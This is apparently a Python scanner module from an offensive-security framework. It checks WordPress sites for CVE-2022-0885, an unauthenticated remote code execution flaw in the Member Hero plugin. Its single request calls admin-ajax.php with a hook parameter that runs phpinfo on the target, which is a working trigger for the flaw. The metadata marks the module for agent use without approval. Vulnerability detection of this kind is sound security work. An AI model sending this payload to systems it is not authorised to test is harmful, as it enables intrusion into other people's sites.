#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Member Hero plugin through 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Member Hero <=1.0.9 - Remote Code Execution Detection',
        'description': 'WordPress Member Hero plugin through 1.0.9 is susceptible to remote code execution. The plugin lacks authorization checks and does not validate the a request parameter in an AJAX action, allowing an attacker to call arbitrary PHP functions with no arguments. An attacker can thus execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'unauth', 'wpscan', 'wp-plugin', 'rce', 'wp', 'wordpress', 'member-hero', 'memberhero', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/8b08b72e-5584-4f25-ab73-5ab0f47412df',
            'https://wordpress.org/plugins/member-hero/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0885',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-0885',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=memberhero_send_form&_memberhero_hook=phpinfo', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('PHP Extension', 'PHP Version', '<!DOCTYPE html',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Member Hero <=1.0.9 - Remote Code Execution detected",
                path='/wp-admin/admin-ajax.php?action=memberhero_send_form&_memberhero_hook=phpinfo',
            )
            return True
        return False

